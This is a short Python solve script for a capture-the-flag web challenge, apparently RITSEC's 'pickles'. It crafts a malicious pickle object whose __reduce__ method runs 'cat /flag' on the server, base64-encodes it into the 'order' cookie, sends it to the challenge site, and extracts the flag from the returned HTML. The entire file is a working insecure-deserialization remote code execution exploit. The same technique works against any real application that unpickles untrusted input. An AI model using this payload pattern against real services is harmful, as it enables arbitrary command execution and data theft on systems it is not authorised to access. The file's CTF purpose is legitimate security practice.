import pickle
import base64
import requests
import subprocess
from bs4 import BeautifulSoup

class RCE:
    def __reduce__(self):
        #code here will be executed only during pickling, not unpickling (only the return statement will be coded in pickle format).
        return (subprocess.check_output,(["cat","/flag"],))

pickled_bytes=pickle.dumps(RCE())    #Object instance ---> Pickle format (bytes)
pickled_base64_bytes = base64.b64encode(pickled_bytes)    #Pickle format (bytes) ---> Base64 encoding (bytes)
pickled_base64_string = pickled_base64_bytes.decode('ascii')   #Base64 encoding (bytes) ---> Base64 encoding (string)
response=requests.get("https://pickles-web.challenges.ctf.ritsec.club/order",cookies={"order":pickled_base64_string})
soup = BeautifulSoup(response.text, 'html.parser')
flag_element=soup.find('h2')
flag=flag_element.get_text()
print(flag[2:len(flag)-3])
